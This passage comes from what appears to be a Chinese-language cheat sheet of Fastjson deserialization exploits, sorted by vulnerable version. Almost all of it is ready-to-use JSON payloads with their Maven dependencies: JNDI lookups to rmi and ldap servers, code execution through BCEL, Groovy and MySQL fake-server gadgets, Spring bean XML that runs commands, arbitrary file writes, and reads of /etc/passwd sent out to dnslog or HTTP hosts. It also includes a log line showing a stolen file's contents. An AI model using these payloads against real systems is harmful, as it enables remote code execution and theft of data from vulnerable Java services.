                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$..",

                     "$ref": "$.x.y.c.connection"
            }
        }
    }
}
```

### ibatis
```xml
<dependency>  
    <groupId>org.mybatis</groupId>  
    <artifactId>mybatis</artifactId>  
    <version>3.5.0</version>  
</dependency>
```

沿用前面BCEL
```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami


{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"{$$BCEL$$..}"}}
```



# Fastjson 1.2.36 - 1.2.62 远程拒绝服务
1.2.62_noneautotype、1.2.60.sec09_noneautotype、1.2.60_noneautotype 同样存在漏洞
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```

# fastjson <= 1.2.60 反序列化代码执行
开启autotype
```xml
<dependency>
    <groupId>commons-configuration</groupId>
    <artifactId>commons-configuration</artifactId>
    <version>1.10</version>
</dependency>
```

```json
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://192.168.16.126:1099/whoopsunix"}
```

# fastjson <= 1.2.61 反序列化代码执行
## configuration
开启autotype
```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-configuration2</artifactId>
    <version>2.7</version>
</dependency>
```

```json
{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://192.168.16.126:1099/whoopsunix"}
```

# fastjson <=1.2.62 反序列化代码执行
## xbean-reflect(确认版本是否1.2.68可用)
开启autotype
```xml
<dependency>
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-reflect</artifactId>
    <version>4.14</version>
</dependency>
```

```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/whoopsunix"}
```

# fastjson <= 1.2.66 反序列化代码执行
## shiro
开启autotype

```xml
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.3</version>
</dependency>
```

```json
// parseObject
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/whoopsunix"}
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/whoopsunix"], "Realms":[""]}
```

## Anteros
开启autotype
```xml
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-Core</artifactId>
    <version>1.2.2</version>
</dependency>
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-DBCP</artifactId>
    <version>1.0.1</version>
</dependency>
```

```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/whoopsunix"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/whoopsunix"}
```

## ignite-jta
开启autotype
```xml
<dependency>
    <groupId>org.apache.ignite</groupId>
    <artifactId>ignite-jta</artifactId>
    <version>2.7.6</version>
</dependency>
```

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/whoopsunix"}
```

# fastjson <= 1.2.67 反序列化代码执行和SSRF漏洞
## shiro
开启autotype
```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.67</version>
    <scope>compile</scope>
</dependency>
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.3</version>
</dependency>
```

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/whoopsunix","instance":{"$ref":"$.instance"}}
```

## ignite-jta
开启autotype
```xml
<!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta -->
<dependency>
    <groupId>org.apache.ignite</groupId>
    <artifactId>ignite-jta</artifactId>
    <version>2.7.6</version>
</dependency>
```

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/whoopsunix"], "tm": {"$ref":"$.tm"}}
```

# fastjson <=1.2.68 反序列化代码执行(AutoCloseable)
## AutoCloseable demo
```json
{"@type":"java.lang.AutoCloseable","@type":"com.example.test.Test","cmd":"open -a Calculator.app"}
```

```java
public class Test implements AutoCloseable{
    public Test(String cmd){
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void close() throws Exception {

    }
}
```

## write file demo(Jdk11)

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileOutputStream",
  "file": "/tmp/nonexist",
  "append": "false"
}
```

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileWriter",
  "file": "/tmp/nonexist",
  "append": "false"
}
```



## MarshalOutputStream 写文件 需要进一步验证

1.2.70以下jdk11可用

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```

## SafeFileOutputStream 文件内容迁移 jdk11测试
target 不存在，temp 存在，则会调用 copy 方法将 temp 的内容迁移到 target
```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
```

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
    "targetPath": "/Users/whoopsunix/Desktop/test",
    "tempPath": "/Users/whoopsunix/Desktop/pass"
}
```



## SafeFileOutputStream 追加写文件
都不存在，BufferedOutputStream -> targetPath
targetPath存在，tempPath 不存在，BufferedOutputStream -> tempPath
targetPath不存在，tempPath 存在，BufferedOutputStream -> targetPath
targetPath存在，tempPath 存在，BufferedOutputStream -> tempPath，利用io复写绕检测

```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
<dependency>
    <groupId>com.sleepycat</groupId>
    <artifactId>je</artifactId>
    <version>18.3.12</version>
</dependency>
```

```json
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "C:/Users/whoopsunix/Desktop/ls/ls/4.txt",
        "tempPath": "a"
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "Y2VzaGk=",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
```

## Commons IO 2.x 读文件
### 利用报错信息逐个猜解(类似盲注)
byte 十进制ASCII码
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    60,101
                ]
            }
        ]
    },
    "address": {
        "$ref": "$.abc.BOM"
    }
}
```

```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.1</version>
</dependency>
```

文件内容为 test，对应ascii[116,101,115,116]
```json
# 逐位填入bytes，可利用二分法爆破
# 正确则返回base64结果
{"abc":{"bOM":{"bytes":"dGVzdA==","charsetName":"UTF-8"},"bOMCharsetName":"UTF-8"},"address":{"$ref":"$.abc.bOM"}}
# 错误
{"abc":{}}
```



### 利用类型不一致报错
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    60,101
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
```


### 无回显 对比正确时请求dnslog
https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6/
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
	  "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
		"@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc/passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [116,101,115,116]
      }
    ]
  },
  "address": {
	  "@type": "java.lang.AutoCloseable",
	  "@type": "org.apache.commons.io.input.BOMInputStream",
	  "delegate": {
		"@type": "org.apache.commons.io.input.ReaderInputStream",
		"reader": {
		  "@type": "jdk.nashorn.api.scripting.URLReader",
		  "url": "http://fj.ppp.dnslog.pw"
		},
		"charsetName": "UTF-8",
		"bufferSize": 1024
	  },
	  "boms": [{"$ref":"$.abc.BOM[0]"}]
  },
  "xxx":{"$ref":"$.address.BOM[0]"}
}
```

### 无回显 对比不正确时请求dnslog 很麻烦
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc/passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          48,
        ]
      }
    ]
  },
  "address" : {
	"@type": "java.lang.AutoCloseable",
	"@type":"org.apache.commons.io.input.CharSequenceReader",
	"charSequence": {
		"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"
	},
	"start": 0,
	"end": 0
  },
  "xxx":{{"@type":"java.net.Inet4Address","val":"cnm.awm6.hyuga.icu"}:"xx"}
}

```

## Mysql connect RCE
### Fake Server
> https://github.com/fnmsd/MySQL_Fake_Server

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.11</version>
</dependency>
```

#### [5.1.11, 5.1.48]
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
        "user": "fileread_/tmp/flag",
        "password": "pass",
        "maxAllowedPacket": "655360",
        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
        "autoDeserialize": "true",
        "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "dbname",
    "url": ""
}
```

#### [6.0.2, 6.0.6]
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
        "connectionString": {
            "url": "jdbc:mysql://localhost:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        }
    }
}
```

#### [8.0.7-dmr, 8.0.19]
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [
                {
                    "host": "127.0.0.1"
                }
            ],
            "slaves": [],
            "properties": {
                "host": "127.0.0.1",
                "user": "yso_CommonsCollections5_open -a Calculator.app",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true",
                "allowLoadLocalInfile": "true"
            }
        }
    }
}
```

# fastjson <= 1.2.80 反序列化代码执行
## groovy RCE
```xml
<dependency>  
    <groupId>org.codehaus.groovy</groupId>  
    <artifactId>groovy</artifactId>  
    <version>3.0.9</version>  
</dependency>
```

新建项目
src/main/java/org/example/GroovyPoc.java
```java
@GroovyASTTransformation(phase = CompilePhase.CONVERSION)  
public class GroovyPoc implements ASTTransformation {  
    public GroovyPoc(){  
        try{  
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
        }catch (Exception ex){  
  
        }  
    }  
  
    @Override  
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {  
  
    }  
}
```
src/main/resources/META-INF/services/org.codehaus.groovy.transform.ASTTransformation
写入恶意类
```
org.example.GroovyPoc
```

```
mvn install
在classes目录开启http服务
```

poc1
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```
poc2
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://192.168.16.132:1234/"
    }
}
```

## jython
[参考猎鹰](https://mp.weixin.qq.com/s/m2U4zNkLCJvO3l1jChzeFw)
```xml
<!-- https://mvnrepository.com/artifact/org.python/jython -->  
<dependency>  
    <groupId>org.python</groupId>  
    <artifactId>jython</artifactId>  
    <version>2.7.0</version>  
</dependency>
```
### psql
https://mp.weixin.qq.com/s/m2U4zNkLCJvO3l1jChzeFw
```xml
<dependency>  
    <groupId>org.postgresql</groupId>  
    <artifactId>postgresql</artifactId>  
    <version>42.3.1</version>  
</dependency>
```

```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"org.postgresql.jdbc.PgConnection",
			"hostSpecs":[{"host":"127.0.0.1","port":2333}],
			"user":"user",
			"database":"test",
			"info":{
				"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
				"socketFactoryArg":"http://127.0.0.1:1234/exp.xml"
			},
			"url":""
		}
	}
}
```

任意spring bean xml exp，其他payload可[参考](https://gv7.me/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/)
exp.xml - jndi
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                        http://www.springframework.org/schema/beans/spring-beans.xsd">
	<bean class="javax.naming.InitialContext" factory-method="doLookup">
		<constructor-arg type="java.lang.String" value="ldap://192.168.66.136:1389/9wbfcp"/>
	</bean>
</beans>
```

exp.xml - cmd
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<beans xmlns="http://www.springframework.org/schema/beans"  
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
       xsi:schemaLocation="http://www.springframework.org/schema/beans  
                        http://www.springframework.org/schema/beans/spring-beans.xsd">  
    <bean id="pb" class="java.lang.ProcessBuilder">  
        <constructor-arg>
            <list>
                <value>cmd.exe</value>  
                <value>/c</value>  
                <value><![CDATA[ calc ]]></value>  
            </list>  
        </constructor-arg>        
        <property name="any" value="#{pb.start()}"/>  
    </bean>
</beans>
```

### mysql
```xml
<dependency>  
    <groupId>mysql</groupId>  
    <artifactId>mysql-connector-java</artifactId>  
    <version>5.1.11</version>  
</dependency>
```

#### [5.1.11, 5.1.48]
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type": "com.mysql.jdbc.JDBC4Connection",
    		"hostToConnectTo": "127.0.0.1",
    		"portToConnectTo": 3306,
	    	"info": {
		        "user": "fileread_/tmp/flag",
		        "password": "pass",
		        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		        "autoDeserialize": "true",
		        "NUM_HOSTS": "1",
		        "maxAllowedPacket":"655360"
    		},
    		"databaseToConnectTo": "dbname",
    		"url": ""
		}
	}
}

```

#### [6.0.2, 6.0.6]
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
			"proxy": {
        		"connectionString": {
            		"url": "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_/tmp/flag"
        		}
    		}
		}
	}
}
```

#### [8.0.7-dmr, 8.0.19]
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
			"proxy":{
				"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
				"connectionUrl":{
					"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
					"masters":[{"host":"127.0.0.1"}],
					"slaves":[],
					"properties":{
						"host":"127.0.0.1",
						"port":"3306",
						"connectionAttributes":"t:cb32",
						"user":"fileread_/tmp/flag",
						"dname":"dname",
						"password":"password",
"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
						"autoDeserialize":"true",
						"allowLoadLocalInfile":"true"
					}
				}
			}
		}
	}
}
```

## AspectJ Tools (Compiler)文件读取
```xml
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
```
1.7.0<=version<=1.9.9

poc需要分三次打，web项目可用
poc1
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```
poc2
```json
   {
      "@type":"java.lang.Class",
      "val":{
         "@type":"java.lang.String"{
      "@type":"java.util.Locale",
      "val":{
         "@type":"com.alibaba.fastjson.JSONObject",{
      "@type":"java.lang.String"
      "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
      "newAnnotationProcessorUnits":[{}]
   }
}
}
```

根据利用环境有多种poc3
### 有回显
```json
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"/etc/passwd"
    }
}
```
### 报错回显
```json
{
  "@type": "java.lang.Character" {
    "C": {
      "x": {
        "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName": "/etc/passwd"
      }
    }
  }
}
```

### dnslog
受限于字符，带出失败
```json
{
    "@type":"java.net.Inet4Address",
    "val":{
        "@type":"java.lang.String"{
        "@type":"java.util.Locale",
        "val":{
            "@type":"com.alibaba.fastjson.JSONObject",{
                "@type":"java.lang.String"
                "@type":"java.util.Locale",
                "country":"fj.ppp.dnslog.pw",
                "language":{
                    "@type":"java.lang.String"{
                    "x":{
				"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
				"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
				"fileName": "/etc/passwd"
			}
                }
            }
        }
    }
  }
}
}
```

## AspectJ  + cc + ognl  http带出文件
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>  
  
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
```

poc1
```json
[{
		"@type": "java.lang.Exception",
		"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
	},
	{
		"@type": "java.lang.Class",
		"val": {
			"@type": "java.lang.String" {
				"@type": "java.util.Locale",
				"val": {
					"@type": "com.alibaba.fastjson.JSONObject",
					{
						"@type": "java.lang.String"
						"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
						"newAnnotationProcessorUnits": [{}]
					}
				}
			},
			{
				"x": {
					"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
					"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
					"fileName": "aaa"
				}
			}]
```

poc2
```json
{
	"su14": {
		"@type": "java.lang.Exception",
		"@type": "ognl.OgnlException"
	},
	"su15": {
		"@type": "java.lang.Class",
		"val": {
			"@type": "com.alibaba.fastjson.JSONObject",
			{
				"@type": "java.lang.String"
				"@type": "ognl.OgnlException",
				"_evaluation": ""
			}
		},
		"su16": {
			"@type": "ognl.Evaluation",
			"node": {
				"@type": "ognl.ASTMethod",
				"p": {
					"@type": "ognl.OgnlParser",
					"stream": {
						"@type": "org.apache.commons.io.input.BOMInputStream",
						"delegate": {
							"@type": "org.apache.commons.io.input.ReaderInputStream",
							"reader": {
								"@type": "jdk.nashorn.api.scripting.URLReader",
								"url": {
									"@type": "java.lang.String" {
										"@type": "java.util.Locale",
										"val": {
											"@type": "com.alibaba.fastjson.JSONObject",
											{
												"@type": "java.lang.String"
												"@type": "java.util.Locale",
												"language": "http://192.168.66.136:1234/",
												"country": {
													"@type": "java.lang.String" [{
														"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
														"fileName": "tmp"
													}]

												}
											}
										},
										"charsetName": "UTF-8",
										"bufferSize": 1024
									},
									"boms": [{
										"@type": "org.apache.commons.io.ByteOrderMark",
										"charsetName": "UTF-8",
										"bytes": [
											0
										]
									}]
								}
							}
						}
					},
					"su17": {
						"$ref": "$.su16.node.p.stream"
					},
					"su18": {
						"$ref": "$.su17.bOM.bytes"
					}
				}
```
带出文件
```
::ffff:192.168.66.136 - - [17/Oct/2022 10:37:49] "GET /_[{"CONTENTS":"FLAG{THIS IS FLAG}","FILENAME":"TMP","MAINTYPENAME":"TMP"}] HTTP/1.1" 400 -
```

## ognl + io读文件
### 利用报错回显 jdk8
类似1.2.68，但实际测试起来效果不太理想
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
```

```json
{
	"su14": {
		"@type": "java.lang.Exception",
		"@type": "ognl.OgnlException"
	},
	"su15": {
		"@type": "java.lang.Class",
		"val": {
			"@type": "com.alibaba.fastjson.JSONObject",
			{
				"@type": "java.lang.String"
				"@type": "ognl.OgnlException",
				"_evaluation": ""
			}
		},
		"su16": {
			"@type": "ognl.Evaluation",
			"node": {
				"@type": "ognl.ASTMethod",
				"p": {
					"@type": "ognl.OgnlParser",
					"stream": {
						"@type": "org.apache.commons.io.input.BOMInputStream",
						"delegate": {
							"@type": "org.apache.commons.io.input.ReaderInputStream",
							"reader": {
								"@type": "jdk.nashorn.api.scripting.URLReader",
								"url": "file://tmp"
							},
							"charsetName": "UTF-8",
							"bufferSize": 1024
						},
						"boms": [{
							"@type": "org.apache.commons.io.ByteOrderMark",
							"charsetName": "UTF-8",
							"bytes": [
								116,101,115,116
							]
						}]
					}
				}
			}
		},
		"su17": {
			"$ref": "$.su16.node.p.stream"
		},
		"su18": {
			"$ref": "$.su17.bOM.bytes"
		}
	}
```

### 利用报错布尔
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file://tmp"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
116,101,115,116]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}]
```

### http报错回显
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file://tmp"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
